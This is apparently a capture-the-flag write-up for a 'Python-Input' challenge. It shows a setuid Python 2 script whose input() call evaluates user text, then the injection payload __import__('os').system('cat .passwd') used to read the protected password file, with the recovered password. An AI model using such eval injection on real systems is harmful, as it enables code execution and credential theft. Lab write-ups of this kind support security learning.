---
layout: default
title: Python-Input
---
This is the source code we get. We can see it uses `input`, and this is `python2`.

```python
#!/usr/bin/python2

import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)


try:
    p = input("Please enter password : ")
except:
    youLose()


with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

I now that `input` in *python2* is like `eval(input())` on *python3*, which let us get `RCE`.
We'll use payload like `__import__('os').system('id')`

![Pasted image 20260310213648.png](./images/images/Pasted image 20260310213648.png)

Okay, now let's give it payload for reading the password:
```bash
app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : __import__('os').system('cat .passwd')
13373439872909134298363103573901
```

so the password is **13373439872909134298363103573901**

